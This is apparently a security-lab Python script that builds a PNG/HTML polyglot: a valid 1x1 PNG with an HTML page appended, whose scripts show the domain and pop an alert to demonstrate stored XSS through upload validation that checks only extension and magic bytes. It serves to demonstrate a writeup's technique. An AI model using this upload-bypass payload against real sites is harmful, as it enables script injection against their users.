#!/usr/bin/env python3
"""Build payloads/avatar-payload.png: a syntactically valid PNG with an
HTML/JS page appended, the exact "dressed up as a valid PNG" trick from the
writeup. Upload-time validation (extension, magic bytes) sees a PNG; the
browser, once served as text/html, sees a page with scripts.

Run again from the repo root if you want a different payload.
"""

import base64
from pathlib import Path

PNG_1x1 = base64.b64decode(
    "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJ"
    "AAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg=="
)

HTML = """\
<!DOCTYPE html>
<html>
<head><title>avatar-payload.png</title></head>
<body>
<h1>Upload time said <code>image/png</code>. Serve time says <code>text/html</code>.</h1>
<p>document =&gt; <script>document.write(document.domain + location.pathname)</script></p>
<script>alert("Stored XSS on " + document.domain);</script>
</body>
</html>
"""

out = Path(__file__).resolve().parent.parent / "payloads" / "avatar-payload.png"
out.write_bytes(PNG_1x1 + HTML.encode())
print(f"[+] wrote {out} ({out.stat().st_size} bytes)")
